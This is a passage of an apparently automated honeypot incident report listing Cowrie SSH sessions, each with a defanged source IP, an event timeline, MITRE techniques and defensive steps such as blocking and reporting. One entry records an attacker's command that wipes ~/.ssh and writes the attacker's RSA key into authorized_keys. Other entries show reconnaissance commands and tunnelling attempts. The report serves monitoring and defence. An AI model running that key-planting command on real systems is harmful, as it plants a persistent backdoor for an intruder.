| `2026-07-13 11:24:35` | `cowrie.login.success` |
| `2026-07-13 11:24:36` | `cowrie.session.params` |
| `2026-07-13 11:24:36` | `cowrie.log.closed` |
| `2026-07-13 11:24:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30320004025d

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:36` | `cowrie.session.connect` |
| `2026-07-13 11:24:36` | `cowrie.login.success` |
| `2026-07-13 11:24:37` | `cowrie.session.params` |
| `2026-07-13 11:24:37` | `cowrie.log.closed` |
| `2026-07-13 11:24:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a514b64bda60

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:37` | `cowrie.session.connect` |
| `2026-07-13 11:24:37` | `cowrie.login.success` |
| `2026-07-13 11:24:38` | `cowrie.session.params` |
| `2026-07-13 11:24:38` | `cowrie.log.closed` |
| `2026-07-13 11:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eae189e70b5

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:38` | `cowrie.session.connect` |
| `2026-07-13 11:24:38` | `cowrie.login.success` |
| `2026-07-13 11:24:38` | `cowrie.session.params` |
| `2026-07-13 11:24:38` | `cowrie.log.closed` |
| `2026-07-13 11:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a49972664c0

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:38` | `cowrie.session.connect` |
| `2026-07-13 11:24:38` | `cowrie.login.success` |
| `2026-07-13 11:24:39` | `cowrie.session.params` |
| `2026-07-13 11:24:39` | `cowrie.log.closed` |
| `2026-07-13 11:24:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-276f9d23de3c

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:39` | `cowrie.session.connect` |
| `2026-07-13 11:24:39` | `cowrie.login.success` |
| `2026-07-13 11:24:40` | `cowrie.session.params` |
| `2026-07-13 11:24:40` | `cowrie.log.closed` |
| `2026-07-13 11:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eac8c4b4a3f

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:40` | `cowrie.session.connect` |
| `2026-07-13 11:24:40` | `cowrie.login.success` |
| `2026-07-13 11:24:41` | `cowrie.session.params` |
| `2026-07-13 11:24:41` | `cowrie.log.closed` |
| `2026-07-13 11:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d5b900ff318

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:41` | `cowrie.session.connect` |
| `2026-07-13 11:24:41` | `cowrie.login.success` |
| `2026-07-13 11:24:41` | `cowrie.session.params` |
| `2026-07-13 11:24:41` | `cowrie.log.closed` |
| `2026-07-13 11:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d1cc6c00c88

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:41` | `cowrie.session.connect` |
| `2026-07-13 11:24:42` | `cowrie.login.success` |
| `2026-07-13 11:24:42` | `cowrie.session.params` |
| `2026-07-13 11:24:42` | `cowrie.log.closed` |
| `2026-07-13 11:24:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44ce24c43290

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:42` | `cowrie.session.connect` |
| `2026-07-13 11:24:42` | `cowrie.login.success` |
| `2026-07-13 11:24:43` | `cowrie.session.params` |
| `2026-07-13 11:24:43` | `cowrie.log.closed` |
| `2026-07-13 11:24:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb33d3ef81b8

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:43` | `cowrie.session.connect` |
| `2026-07-13 11:24:43` | `cowrie.login.success` |
| `2026-07-13 11:24:44` | `cowrie.session.params` |
| `2026-07-13 11:24:44` | `cowrie.log.closed` |
| `2026-07-13 11:24:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-317015635221

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:44` | `cowrie.session.connect` |
| `2026-07-13 11:24:44` | `cowrie.login.success` |
| `2026-07-13 11:24:45` | `cowrie.session.params` |
| `2026-07-13 11:24:45` | `cowrie.log.closed` |
| `2026-07-13 11:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e87c857db59b

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:45` | `cowrie.session.connect` |
| `2026-07-13 11:24:45` | `cowrie.login.success` |
| `2026-07-13 11:24:45` | `cowrie.session.params` |
| `2026-07-13 11:24:45` | `cowrie.log.closed` |
| `2026-07-13 11:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b1760371d93

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:45` | `cowrie.session.connect` |
| `2026-07-13 11:24:46` | `cowrie.login.success` |
| `2026-07-13 11:24:46` | `cowrie.session.params` |
| `2026-07-13 11:24:46` | `cowrie.log.closed` |
| `2026-07-13 11:24:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93548b6a7b17

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 11:27 |
| **Last Seen** | 2026-07-13 11:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:27:41` | `cowrie.session.connect` |
| `2026-07-13 11:27:41` | `cowrie.client.version` |
| `2026-07-13 11:27:41` | `cowrie.client.kex` |
| `2026-07-13 11:27:43` | `cowrie.login.success` |
| `2026-07-13 11:27:44` | `cowrie.session.params` |
| `2026-07-13 11:27:44` | `cowrie.command.input` |
| `2026-07-13 11:27:44` | `cowrie.log.closed` |
| `2026-07-13 11:27:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fff8212accc

| Field | Detail |
|---|---|
| **Source IP** | `219.129.236[.]174` |
| **First Seen** | 2026-07-13 11:28 |
| **Last Seen** | 2026-07-13 11:28 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:28:04` | `cowrie.session.connect` |
| `2026-07-13 11:28:06` | `cowrie.client.version` |
| `2026-07-13 11:28:06` | `cowrie.client.kex` |
| `2026-07-13 11:28:08` | `cowrie.login.success` |
| `2026-07-13 11:28:09` | `cowrie.direct-tcpip.request` |
| `2026-07-13 11:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.129.236[.]174` to AbuseIPDB if not already reported
- [ ] Block `219.129.236[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0383d84fffb

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]2` |
| **First Seen** | 2026-07-13 11:38 |
| **Last Seen** | 2026-07-13 11:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:38:27` | `cowrie.session.connect` |
| `2026-07-13 11:38:27` | `cowrie.client.version` |
| `2026-07-13 11:38:27` | `cowrie.client.kex` |
| `2026-07-13 11:38:27` | `cowrie.login.success` |
| `2026-07-13 11:38:28` | `cowrie.session.params` |
| `2026-07-13 11:38:28` | `cowrie.command.input` |
| `2026-07-13 11:38:28` | `cowrie.command.failed` |
| `2026-07-13 11:38:28` | `cowrie.log.closed` |
| `2026-07-13 11:38:29` | `cowrie.session.params` |
| `2026-07-13 11:38:29` | `cowrie.command.input` |
| `2026-07-13 11:38:29` | `cowrie.session.file_download` |
| `2026-07-13 11:38:29` | `cowrie.log.closed` |
| `2026-07-13 11:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07004ed7af0e

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]2` |
| **First Seen** | 2026-07-13 11:38 |
| **Last Seen** | 2026-07-13 11:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:38:29` | `cowrie.session.connect` |
| `2026-07-13 11:38:29` | `cowrie.client.version` |
| `2026-07-13 11:38:29` | `cowrie.client.kex` |
| `2026-07-13 11:38:29` | `cowrie.login.success` |
| `2026-07-13 11:38:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c16e1e52d68e

| Field | Detail |
|---|---|
| **Source IP** | `103.143.231[.]2` |
| **First Seen** | 2026-07-13 11:38 |
| **Last Seen** | 2026-07-13 11:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:38:29` | `cowrie.session.connect` |
| `2026-07-13 11:38:29` | `cowrie.client.version` |
| `2026-07-13 11:38:30` | `cowrie.client.kex` |
| `2026-07-13 11:38:30` | `cowrie.login.success` |
| `2026-07-13 11:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.231[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.143.231[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2689a0231708

| Field | Detail |
|---|---|
| **Source IP** | `118.26.111[.]107` |
| **First Seen** | 2026-07-13 11:40 |
| **Last Seen** | 2026-07-13 11:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:40:21` | `cowrie.session.connect` |
| `2026-07-13 11:40:22` | `cowrie.telnet.option` |
| `2026-07-13 11:40:22` | `cowrie.telnet.option` |
| `2026-07-13 11:41:22` | `cowrie.login.success` |
| `2026-07-13 11:41:22` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `118.26.111[.]107` to AbuseIPDB if not already reported
- [ ] Block `118.26.111[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aecd332ebc45

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:41 |
| **Last Seen** | 2026-07-13 11:41 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:41:23` | `cowrie.session.connect` |
| `2026-07-13 11:41:23` | `cowrie.login.success` |
| `2026-07-13 11:41:24` | `cowrie.session.params` |
| `2026-07-13 11:41:24` | `cowrie.command.input` |
| `2026-07-13 11:41:33` | `cowrie.log.closed` |
| `2026-07-13 11:41:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cbea146bcfd

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:41 |
| **Last Seen** | 2026-07-13 11:41 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:41:33` | `cowrie.session.connect` |
| `2026-07-13 11:41:33` | `cowrie.login.success` |
| `2026-07-13 11:41:34` | `cowrie.session.params` |
| `2026-07-13 11:41:34` | `cowrie.command.input` |
| `2026-07-13 11:41:43` | `cowrie.log.closed` |
| `2026-07-13 11:41:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8afaad29efaa

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:41 |
| **Last Seen** | 2026-07-13 11:41 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:41:43` | `cowrie.session.connect` |
| `2026-07-13 11:41:43` | `cowrie.login.success` |
| `2026-07-13 11:41:44` | `cowrie.session.params` |
| `2026-07-13 11:41:44` | `cowrie.command.input` |
| `2026-07-13 11:41:53` | `cowrie.log.closed` |
| `2026-07-13 11:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d84924a88f8

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:41 |
| **Last Seen** | 2026-07-13 11:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:41:53` | `cowrie.session.connect` |
| `2026-07-13 11:41:53` | `cowrie.login.success` |
| `2026-07-13 11:41:54` | `cowrie.session.params` |
| `2026-07-13 11:41:54` | `cowrie.command.input` |
| `2026-07-13 11:42:03` | `cowrie.log.closed` |
| `2026-07-13 11:42:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-759bc59ed248

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:42 |
| **Last Seen** | 2026-07-13 11:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:42:03` | `cowrie.session.connect` |
| `2026-07-13 11:42:03` | `cowrie.login.success` |
| `2026-07-13 11:42:04` | `cowrie.session.params` |
| `2026-07-13 11:42:04` | `cowrie.command.input` |
| `2026-07-13 11:42:13` | `cowrie.log.closed` |
| `2026-07-13 11:42:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfca76ff1a71

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:42 |
| **Last Seen** | 2026-07-13 11:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:42:14` | `cowrie.session.connect` |
| `2026-07-13 11:42:14` | `cowrie.login.success` |
| `2026-07-13 11:42:14` | `cowrie.session.params` |
| `2026-07-13 11:42:14` | `cowrie.command.input` |
| `2026-07-13 11:42:24` | `cowrie.log.closed` |
| `2026-07-13 11:42:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad7b241ccf2b

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]73` |
| **First Seen** | 2026-07-13 11:42 |
| **Last Seen** | 2026-07-13 11:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:42:17` | `cowrie.session.connect` |
| `2026-07-13 11:42:18` | `cowrie.client.version` |
| `2026-07-13 11:42:18` | `cowrie.client.kex` |
| `2026-07-13 11:42:20` | `cowrie.login.success` |
| `2026-07-13 11:42:20` | `cowrie.direct-tcpip.request` |
| `2026-07-13 11:42:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]73` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a24b4e780ff

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:42 |
| **Last Seen** | 2026-07-13 11:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:42:24` | `cowrie.session.connect` |
| `2026-07-13 11:42:24` | `cowrie.login.success` |
| `2026-07-13 11:42:25` | `cowrie.session.params` |
| `2026-07-13 11:42:25` | `cowrie.command.input` |
| `2026-07-13 11:42:34` | `cowrie.log.closed` |
| `2026-07-13 11:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3b83744d4aa

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-13 11:42 |
| **Last Seen** | 2026-07-13 11:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:42:26` | `cowrie.session.connect` |
| `2026-07-13 11:42:27` | `cowrie.client.version` |
| `2026-07-13 11:42:27` | `cowrie.client.kex` |
| `2026-07-13 11:42:29` | `cowrie.login.success` |
| `2026-07-13 11:42:30` | `cowrie.direct-tcpip.request` |
| `2026-07-13 11:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f5cd9947ae6

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:42 |
| **Last Seen** | 2026-07-13 11:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
